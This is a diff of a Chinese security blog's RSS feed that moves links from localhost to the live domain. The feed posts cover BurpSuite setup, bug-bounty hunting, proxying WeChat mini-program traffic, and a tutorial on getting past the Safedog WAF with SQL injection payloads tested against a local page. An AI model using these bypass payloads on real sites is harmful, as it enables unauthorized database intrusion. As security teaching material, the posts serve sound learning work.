@@ -1,22 +1,22 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
         <title>所有文章 - bysec</title>
-        <link>http://localhost:1313/posts/</link>
+        <link>https://www.bysec.cn/posts/</link>
         <description>所有文章 | bysec</description>
         <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>bysec@qq.com (bysec)</managingEditor>
-            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sun, 03 Dec 2023 13:43:37 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/posts/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sun, 03 Dec 2023 13:43:37 &#43;0800</lastBuildDate><atom:link href="https://www.bysec.cn/posts/" rel="self" type="application/rss+xml" /><item>
     <title>工具集</title>
-    <link>http://localhost:1313/%E5%B7%A5%E5%85%B7/</link>
+    <link>https://www.bysec.cn/%E5%B7%A5%E5%85%B7/</link>
     <pubDate>Sun, 15 May 2022 19:08:11 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E5%B7%A5%E5%85%B7/</guid>
+    </author><guid>https://www.bysec.cn/%E5%B7%A5%E5%85%B7/</guid>
     <description><![CDATA[]]></description>
 </item><item>
     <title>BurpSuite安装</title>
-    <link>http://localhost:1313/burpsuite%E5%AE%89%E8%A3%85/</link>
+    <link>https://www.bysec.cn/burpsuite%E5%AE%89%E8%A3%85/</link>
     <pubDate>Sun, 03 Dec 2023 13:43:37 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/burpsuite%E5%AE%89%E8%A3%85/</guid>
+    </author><guid>https://www.bysec.cn/burpsuite%E5%AE%89%E8%A3%85/</guid>
     <description><![CDATA[<h2 id="下载" class="headerLink">
     <a href="#%e4%b8%8b%e8%bd%bd" class="header-mark"></a>下载</h2><ul>
 <li><a href="https://portswigger.net/burp/releases#professional" target="_blank" rel="noopener noreferrer">BurpSuite</a></li>
@@ -51,10 +51,10 @@
 </div>]]></description>
 </item><item>
     <title>SRC混子的漏洞挖掘之道</title>
-    <link>http://localhost:1313/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/</link>
+    <link>https://www.bysec.cn/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/</link>
     <pubDate>Thu, 30 Nov 2023 09:06:55 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/</guid>
+    </author><guid>https://www.bysec.cn/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://xz.aliyun.com/t/8501" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/8501</a></em></p>
 </blockquote>
@@ -604,19 +604,19 @@
     <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结</h4><p>挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。</p>]]></description>
 </item><item>
     <title>如何在mac上抓小程序的流量</title>
-    <link>http://localhost:1313/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/</link>
+    <link>https://www.bysec.cn/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/</link>
     <pubDate>Sat, 22 Oct 2022 11:24:28 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/</guid>
+    </author><guid>https://www.bysec.cn/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://xz.aliyun.com/t/8501" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/8501</a></em></p>
 </blockquote>
 <h2 id="如何在mac上抓小程序的流量" class="headerLink">
     <a href="#%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f" class="header-mark"></a>如何在mac上抓小程序的流量</h2><p>通过Proxifier工具代理微信小程序流量到Burp</p>
 <h3 id="安装burpsuite证书到macos系统中" class="headerLink">
-    <a href="#%e5%ae%89%e8%a3%85burpsuite%e8%af%81%e4%b9%a6%e5%88%b0macos%e7%b3%bb%e7%bb%9f%e4%b8%ad" class="header-mark"></a>安装Burpsuite证书到macOS系统中</h3><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/1.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/1.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/1.png">
+    <a href="#%e5%ae%89%e8%a3%85burpsuite%e8%af%81%e4%b9%a6%e5%88%b0macos%e7%b3%bb%e7%bb%9f%e4%b8%ad" class="header-mark"></a>安装Burpsuite证书到macOS系统中</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/1.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/1.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/1.png">
         
-    </a></figure></p>
+    </a></p>
 <h3 id="安装proxifier并添加proxifier规则" class="headerLink">
     <a href="#%e5%ae%89%e8%a3%85proxifier%e5%b9%b6%e6%b7%bb%e5%8a%a0proxifier%e8%a7%84%e5%88%99" class="header-mark"></a>安装proxifier并添加Proxifier规则</h3><blockquote>
 <p>Your name or company name:<br>
@@ -632,36 +632,36 @@ Your registration key:<br>
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">brew install --cask proxifier
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/2.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/2.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/2.png">
+</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/2.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/2.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/2.png">
         
-    </a></figure></p>
+    </a></p>
 <h3 id="添加代理和配置代理规则" class="headerLink">
-    <a href="#%e6%b7%bb%e5%8a%a0%e4%bb%a3%e7%90%86%e5%92%8c%e9%85%8d%e7%bd%ae%e4%bb%a3%e7%90%86%e8%a7%84%e5%88%99" class="header-mark"></a>添加代理和配置代理规则</h3><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/3.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/3.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/3.png">
+    <a href="#%e6%b7%bb%e5%8a%a0%e4%bb%a3%e7%90%86%e5%92%8c%e9%85%8d%e7%bd%ae%e4%bb%a3%e7%90%86%e8%a7%84%e5%88%99" class="header-mark"></a>添加代理和配置代理规则</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/3.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/3.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/3.png">
         
-    </a></figure></p>
+    </a></p>
 <blockquote>
 <p>微信小程序路径 : /Applications/WeChat.app/Contents/MacOS/Mini Program.app</p>
 </blockquote>
-<p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/4.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/4.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/4.png">
+<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/4.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/4.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/4.png">
         
-    </a></figure></p>
+    </a></p>
 <blockquote>
 <p>⚠️ 先启动Proxifier，再启动Burpsuite，最后打开微信小程序,(最好关掉其他代理)</p>
 </blockquote>
 <h3 id="抓包成功" class="headerLink">
-    <a href="#%e6%8a%93%e5%8c%85%e6%88%90%e5%8a%9f" class="header-mark"></a>抓包成功</h3><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/5.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/5.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/5.png">
+    <a href="#%e6%8a%93%e5%8c%85%e6%88%90%e5%8a%9f" class="header-mark"></a>抓包成功</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/5.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/5.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/5.png">
         
-    </a></figure></p>
+    </a></p>
 <h3 id="存在其他代理如clashx时proxifier设置方法" class="headerLink">
-    <a href="#%e5%ad%98%e5%9c%a8%e5%85%b6%e4%bb%96%e4%bb%a3%e7%90%86%e5%a6%82clashx%e6%97%b6proxifier%e8%ae%be%e7%bd%ae%e6%96%b9%e6%b3%95" class="header-mark"></a>存在其他代理(如clashX)时，Proxifier设置方法</h3><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/6.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/6.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/6.png">
+    <a href="#%e5%ad%98%e5%9c%a8%e5%85%b6%e4%bb%96%e4%bb%a3%e7%90%86%e5%a6%82clashx%e6%97%b6proxifier%e8%ae%be%e7%bd%ae%e6%96%b9%e6%b3%95" class="header-mark"></a>存在其他代理(如clashX)时，Proxifier设置方法</h3><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e5%a6%82%e4%bd%95%e5%9c%a8mac%e4%b8%8a%e6%8a%93%e5%b0%8f%e7%a8%8b%e5%ba%8f%e7%9a%84%e6%b5%81%e9%87%8f/6.png" title="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/6.png" data-thumbnail="https://www.bysec.cn/OSS/img/如何在mac上抓小程序的流量/6.png">
         
-    </a></figure></p>]]></description>
+    </a></p>]]></description>
 </item><item>
     <title>kali修改为国内源</title>
-    <link>http://localhost:1313/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/</link>
+    <link>https://www.bysec.cn/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/</link>
     <pubDate>Sun, 21 Mar 2021 08:16:48 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/</guid>
+    </author><guid>https://www.bysec.cn/kali%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/</guid>
     <description><![CDATA[<h2 id="打开配置文件" class="headerLink">
     <a href="#%e6%89%93%e5%bc%80%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6" class="header-mark"></a>打开配置文件</h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -825,10 +825,10 @@ Your registration key:<br>
 </div>]]></description>
 </item><item>
     <title>给表弟的Web安全入门建议</title>
-    <link>http://localhost:1313/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/</link>
+    <link>https://www.bysec.cn/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/</link>
     <pubDate>Wed, 13 Jan 2021 09:32:44 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/</guid>
+    </author><guid>https://www.bysec.cn/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://sosly.me/index.php/2017/07/17/studywebsec/" target="_blank" rel="noopener noreferrer">https://sosly.me/index.php/2017/07/17/studywebsec/</a></em></p>
 </blockquote>
@@ -959,10 +959,10 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 </ol>]]></description>
 </item><item>
     <title>绕waf系列之绕安全狗</title>
-    <link>http://localhost:1313/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/</link>
+    <link>https://www.bysec.cn/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/</link>
     <pubDate>Tue, 15 Dec 2020 21:18:35 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/</guid>
+    </author><guid>https://www.bysec.cn/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/</guid>
     <description><![CDATA[<h1 id="攻击的特定" class="headerLink">
     <a href="#%e6%94%bb%e5%87%bb%e7%9a%84%e7%89%b9%e5%ae%9a" class="header-mark"></a>攻击的特定:</h1><p>攻击二象性:已知攻击和未知攻击</p>
 <h1 id="目前市面主流的waf产品" class="headerLink">
@@ -997,35 +997,35 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <h1 id="waf的几种部署模式" class="headerLink">
     <a href="#waf%e7%9a%84%e5%87%a0%e7%a7%8d%e9%83%a8%e7%bd%b2%e6%a8%a1%e5%bc%8f" class="header-mark"></a>WAF的几种部署模式:</h1><h2 id="基于dns解析" class="headerLink">
     <a href="#%e5%9f%ba%e4%ba%8edns%e8%a7%a3%e6%9e%90" class="header-mark"></a>基于DNS解析</h2><p>修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器
-<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png">
+<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png">
         
-    </a></figure></p>
+    </a></p>
 <h2 id="串联模式" class="headerLink">
     <a href="#%e4%b8%b2%e8%81%94%e6%a8%a1%e5%bc%8f" class="header-mark"></a>串联模式</h2><p>一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署.
-<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png">
+<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png">
         
-    </a></figure></p>
-<p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png">
+    </a></p>
+<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png">
         
-    </a></figure></p>
+    </a></p>
 <h2 id="旁路模式" class="headerLink">
     <a href="#%e6%97%81%e8%b7%af%e6%a8%a1%e5%bc%8f" class="header-mark"></a>旁路模式</h2><p>利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断.
-<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png">
+<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png">
         
-    </a></figure></p>
+    </a></p>
 <h2 id="软件嵌入中间件检测引擎模式" class="headerLink">
     <a href="#%e8%bd%af%e4%bb%b6%e5%b5%8c%e5%85%a5%e4%b8%ad%e9%97%b4%e4%bb%b6%e6%a3%80%e6%b5%8b%e5%bc%95%e6%93%8e%e6%a8%a1%e5%bc%8f" class="header-mark"></a>软件嵌入中间件+检测引擎模式</h2><p>在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务
-<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png">
+<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png">
         
-    </a></figure></p>
+    </a></p>
 <h1 id="waf为什么会被绕过" class="headerLink">
     <a href="#waf%e4%b8%ba%e4%bb%80%e4%b9%88%e4%bc%9a%e8%a2%ab%e7%bb%95%e8%bf%87" class="header-mark"></a>WAF为什么会被绕过:</h1><ol>
 <li>鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作</li>
 <li>WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性</li>
 <li>硬件WAF自身往往存在漏洞
-<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png">
+<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png">
         
-    </a></figure></li>
+    </a></li>
 </ol>
 <ul>
 <li>架构:waf部署模式</li>
@@ -1036,9 +1036,9 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
     <a href="#waf%e7%bb%95%e8%bf%87%e5%ae%9e%e6%88%98-%e7%bb%95%e8%bf%87%e5%ae%89%e5%85%a8%e7%8b%97%e8%bf%9b%e8%a1%8c%e6%b3%a8%e5%85%a5" class="header-mark"></a>WAF绕过实战—-绕过安全狗进行注入</h1><p>所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护</p>
 <h2 id="实验环境" class="headerLink">
     <a href="#%e5%ae%9e%e9%aa%8c%e7%8e%af%e5%a2%83" class="header-mark"></a>实验环境:</h2><p>环境:安全狗Apache最新版
-<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png">
+<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png">
         
-    </a></figure></p>
+    </a></p>
 <p>本地测试代码(PHP):</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1078,9 +1078,9 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1  and 1=1%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png">
+</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png">
         
-    </a></figure></p>
+    </a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1131,9 +1131,9 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png">
+</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png">
         
-    </a></figure></p>
+    </a></p>
 <p>另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&amp;&amp; || ,oracle不支持 &amp;&amp; ||）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1161,18 +1161,18 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png">
+</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png">
         
-    </a></figure></p>
+    </a></p>
 <h2 id="绕过union-select查询" class="headerLink">
     <a href="#%e7%bb%95%e8%bf%87union-select%e6%9f%a5%e8%af%a2" class="header-mark"></a>绕过union select查询</h2><p>使用union xxx页面正常
